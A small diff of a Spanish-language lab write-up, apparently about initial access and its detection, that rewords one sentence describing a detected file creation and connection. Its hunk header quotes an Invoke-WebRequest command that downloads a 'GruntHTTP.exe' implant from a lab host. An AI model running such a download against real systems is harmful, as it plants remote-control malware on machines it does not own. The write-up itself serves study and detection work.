@@ -98,7 +98,7 @@ Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
 
 ![image007.png](/uploads/InitialAccess/image007.png)
 
-Como vemos, se detecta una creación del fichero, y acto seguido la conexión a nuestro equipo
+Como vemos, se detecta una creación del fichero, y acto seguido una conexión.
 
 ![image008.png](/uploads/InitialAccess/image008.png)
 
